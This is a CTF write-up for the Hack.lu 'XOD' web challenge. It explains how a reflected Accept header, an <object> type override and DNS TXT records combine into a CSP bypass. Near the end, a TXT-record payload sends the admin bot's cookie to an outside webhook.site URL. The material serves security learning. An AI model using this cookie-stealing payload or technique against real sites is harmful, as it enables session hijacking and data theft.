---
title: "Hacklu - XOD"
date: 2025-10-26
cover: images/hacklu2.png
tags: ["web", "hacklu"]
categories:
    - "ctf"
---

# XOD

## Description

The challenge give us an DNS over HTTPS server wrote on php:

```php
<?php

header("Content-Security-Policy: default-src 'self' 'unsafe-eval'; style-src 'unsafe-inline'");

if (!isset($_GET['dns']) || !is_string($_GET['dns'])) {
    highlight_file(__FILE__);
    exit();
}

// DoH
$dnsQuery = base64_decode($_GET['dns'], true);
if ($dnsQuery === false) {
    http_response_code(400);
    exit('Invalid base64 encoding in "dns" parameter.');
}

$socket = @stream_socket_client("udp://1.1.1.1:53", timeout:1);
if (!$socket) {
    http_response_code(502);
    exit('Error: Could not connect to DNS server.');
}

stream_set_timeout($socket, 1);
fwrite($socket, $dnsQuery);
$response = fread($socket, 4096);
fclose($socket);

if ($response === false || $response === '') {
    http_response_code(500);
    exit('Failed to retrieve a DNS response.');
}

$accept = isset($_SERVER['HTTP_ACCEPT']) ? $_SERVER['HTTP_ACCEPT'] : 'application/dns-message';
header("Content-Type: $accept");

echo $response;
```

The code of the bot admin:
```js
const express = require('express');
const puppeteer = require('puppeteer');
const rateLimit = require('express-rate-limit');


const FLAG = process.env.FLAG || 'flag{**********************}';
const DOMAIN = process.env.DOMAIN || 'http://chall';
const PORT = process.env.PORT || 1337;


const app = express();
app.use(express.json());
app.set('trust proxy', 1);

const reportLimiter = rateLimit({
    windowMs: 1 * 60 * 1000, // 1 minute
    max: 2,
    message: { error: 'Too many requests, please try again later.' }
});


function sleep(ms) {
    return new Promise(res => setTimeout(res, ms));
}

async function visit(url) {
    const browser = await puppeteer.launch({
        browser: 'firefox',
        headless: true,
    });
    console.log('Browser launched');
    console.log('Visiting URL:', url);

    try {
        let page = await browser.newPage()
        await page.goto(DOMAIN, { waitUntil: 'networkidle0' });

        const cookies = [{
            name: 'flag',
            value: FLAG
        }];

        await page.setCookie(...cookies);
        await page.close();

        page = await browser.newPage();
        await page.goto(url, { waitUntil: [] });

        await sleep(3_000);
        // whew... enough of that.
    } catch (err) {
        console.error('Error visiting page:', err);
    } finally {
        await browser.close();
    }
}

app.post('/report', reportLimiter, async (req, res) => {
    const { url } = req.body;

    const PREFIX = 'http'
    if (!url || typeof url !== 'string' || !url.startsWith(PREFIX)) {
        return res.status(400).json({ error: `Invalid URL. Url should be a string and start with ${PREFIX}.` });
    }

    try {
        await visit(url);
        res.json({ success: true });
    } catch (err) {
        console.error('Error on /report', err);
        res.status(500).json({ error: 'Failed to visit URL.' });
    }
});

app.get('/', (req, res) => {
    res.sendFile('bot.html', { 'root':__dirname });
})

app.listen(PORT, () => {
    console.log(`Bot is running on port http://127.0.0.1:${PORT}`);
})
```

## Explanation

>For do that, I used Firefox 142 because it's the version that the Puppeteer admin bot uses.

When the server receives a valid request to `?dns=yourbase64dns`, it returns the DNS records. First, we need to create a valid base64 string. To do that, we can use Python:

```python
#!/usr/bin/env python3
import sys
import base64
import dns.message
import dns.rdatatype

domain = sys.argv[1]

query = dns.message.make_query(domain, dns.rdatatype.TXT)
wire = query.to_wire()
b64 = base64.b64encode(wire).decode('utf-8')
print(b64)
```

This generates a valid base64 string to query TXT records:

```
➜  ctf python3 dns_query_simple.py google.es
kl0BAAABAAAAAAAABmdvb2dsZQJlcwAAEAAB
```

As we can see in the server's source code, if there is no `Accept` header, it sets `application/dns-message` by default. However, the bot uses Firefox launched by Puppeteer, and Firefox sets the `Accept` header to `text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8` by default. When the server reflects this header as the `Content-Type`, the browser tries to parse the response as XML:

![](img/xml_error.png)

To bypass this, we can use an embedded HTML `<object>` element with the `type` attribute set to `text/html`. This forces the browser to send an `Accept: text/html` header, making the server respond with `Content-Type: text/html`. To do that, we create our own HTML page:

```html
<body>
<script>

let o = document.createElement('object');

o.data = 'https://one.one.xod.one/?dns=kl0BAAABAAAAAAAABmdvb2dsZQJlcwAAEAAB'

o.type = 'text/html'

document.body.appendChild(o)


</script>
```

![](img/dns_google.png)

Now we can create a DNS record and modify the TXT records to insert HTML that will be rendered. To create the DNS record, I'm going to use this website: https://freedns.afraid.org/

![](img/record_change.png)

```
➜  ctf python3 dns_query_simple.py fouen.chickenkiller.com
uy4BAAABAAAAAAAABWZvdWVuDWNoaWNrZW5raWxsZXIDY29tAAAQAAE=
```

![](img/html_test.png)

Now we can insert HTML correctly, but we need to steal the cookie from the bot. However, there's a Content Security Policy (CSP) that restricts JavaScript execution. The CSP specifies that JavaScript must be loaded from the same origin (using the `'self'` directive), which means we cannot execute inline JavaScript directly:

```php
header("Content-Security-Policy: default-src 'self' 'unsafe-eval'; style-src 'unsafe-inline'");
```

To work with this CSP and execute JavaScript, we can do the following:

First, we need to comment out the binary DNS response to avoid syntax errors. We can set the Transaction ID (TXID) to `0x2F2A`, which represents `/*`. Then, we start the TXT record with `*/` to close the multi-line comment.

Generate the valid base64 with the TXID `0x2F2A (/*)`:

```python
#!/usr/bin/env python3
import sys
import base64
import dns.message
import dns.rdatatype

domain = sys.argv[1]

query = dns.message.make_query(domain, dns.rdatatype.TXT, id=0x2F2A)
wire = query.to_wire()
b64 = base64.b64encode(wire).decode('utf-8')
print(b64)
```

```
➜  ctf python3 dns_query.py fouen.chickenkiller.com
LyoBAAABAAAAAAAABWZvdWVuDWNoaWNrZW5raWxsZXIDY29tAAAQAAE=
```

The structure of the TXT record is as follows:

![](img/excalidraw.png)

The website is going to behave this way:

1. It will load the object and interprets the HTML because it interprets the rest as simple text, in this way we tell it that with a `<script>` tag it loads the javascript that the website itself hosts in the DNS response of our domain, so we bypass the CSP.

2. Load the Javascript which does not give any syntax error since the binary answer is commented and the HTML too so the website only sees valid javascript and executes it

We modify the `o.data` in our HTML page and trigger an alert:

![](img/alert.png)

## Solve

Firefox blocks third-party cookies by default, preventing access to `document.cookie` in embedded contexts. To bypass this, we use JavaScript to open a new window on the vulnerable domain. This window runs in a first-party context, giving us access to the cookies. We then wait for the website to load using `setTimeout`, and finally redirect to our webhook, appending the cookie from the window.

The final TXT record looks like this:

```
*/w=open('https://one.one.xod.one?window','_blank');setTimeout(()=>location='https://webhook.site/69d13d94-6f85-44bc-8ca3-12d2c7ffb037?'+w.document.cookie,1000)//<script src='?dns=LyoBAAABAAAAAAAABWZvdWVuDWNoaWNrZW5raWxsZXIDY29tAAAQAAE'></script>
```

Finally, we need to make our exploit server publicly accessible. In my case, I used `cloudflared` to expose it to the internet.

We get the flag!

![](img/flag.png)

## Why doesn't this work on Firefox 144?

This exploit works on Firefox versions ≤143. Firefox 144 fixed CVE-2025-11712, which patched the ability to use the `type` attribute of an `<object>` tag to override browser behavior when handling resources without proper Content-Type headers.

https://www.mozilla.org/en-US/security/advisories/mfsa2025-81/#CVE-2025-11712

![](img/cve.png)